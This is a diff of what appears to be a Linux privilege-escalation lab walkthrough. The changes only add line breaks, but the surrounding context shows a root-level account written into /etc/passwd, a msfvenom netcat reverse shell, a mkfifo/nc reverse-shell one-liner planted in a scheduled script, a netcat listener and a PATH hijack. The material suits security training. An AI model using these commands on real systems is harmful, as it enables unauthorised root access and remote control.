@@ -11,6 +11,8 @@
 python3 -m http.server 8000
 ```
 
+<br>
+
 (Terminal 2:)
 ```shell
 ssh user3@10.10.178.20
@@ -22,6 +24,8 @@ ssh user3@10.10.178.20
 	
 	./LinEnum.sh
 ```
+
+<br>
 
 (Terminal 1/python3:)
 ```shell
@@ -109,10 +113,14 @@ openssl passwd -1 -salt "new" "123"
 	nano /etc/passwd
 ```
 
+<br>
+
 (add:)
 ```text
 new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 ```
+
+<br>
 
 (Terminal 2/ssh:)
 ```shell
@@ -190,6 +198,8 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=8888 R
 	echo 'mkfifo /tmp/zhygeeo; nc 10.14.27.197 8888 0</tmp/zhygeeo | /bin/sh >/tmp/zhygeeo 2>&1; rm /tmp/zhygeeo' > /home/user4/Desktop/autoscript.sh
 ```
 
+<br>
+
 (Terminal 1:)
 ```shell
 nc -lvnp 8888
@@ -233,6 +243,8 @@ nc -lvnp 8888
 ```
 
 > echo "/bin/bash" > ls
+
+<br>
 
 (Terminal 2/ssh:)
 ```shell
